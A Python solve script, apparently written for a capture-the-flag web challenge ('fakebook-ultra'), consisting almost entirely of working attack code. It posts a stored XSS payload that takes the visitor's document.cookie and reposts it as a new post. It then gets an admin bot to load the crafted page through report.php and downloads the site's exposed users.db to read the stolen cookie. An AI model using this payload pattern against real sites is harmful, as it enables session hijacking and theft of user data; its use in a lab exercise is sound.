import requests
import secrets
import urllib.parse
from time import sleep

URL = 'http://7c8d89fa93784b95bda04f7f8dc7a26a0.fakebook-ultra.tscctf.com:36369'
sess = requests.Session()

def login(username, password, sess: requests.Session):
    r = sess.post(URL + '/index.php', data={
        'username': username,
        'password': password
    })
    # print(r.text)

def post(content, sess: requests.Session):
    r = sess.post(URL + '/dashboard.php', data={
        'content': content
    })
    # print(r.text)

def report(url):
    r = requests.post(URL + '/report.php', data={
        'url': url
    })
    # print(r.text)

def dump_db():
    r = requests.get(URL + '/users.db')
    with open('users.db', 'wb') as f:
        f.write(r.content)

def main():
    username = secrets.token_hex(4)
    password = 'f138bd64e11c4425'
    login(username, password, sess)

    content = '''
    <script>
        async function createPost(content) {
            const response = await fetch('dashboard.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                    'content': content
                })
            });

            if (response.ok) {
                const result = await response.text();
                console.log('Post created successfully:', result);
            } else {
                console.error('Failed to create post:', response.statusText);
            }
        }
        createPost(document.cookie);
    </script>
    '''
    post(content, sess)

    print(f'{ username = }')
    print(f'{ password = }')

    payload = f'{URL}/posts.php?username={urllib.parse.quote(username)}{'&a'*1000}'
    print(payload)
    report(payload)

    sleep(20)
    dump_db()

    import sqlite3
    # print select the latest post
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('SELECT * FROM posts ORDER BY id DESC LIMIT 1')
    for row in c.fetchall():
        print(row)
    conn.close()


if __name__ == '__main__':
    main()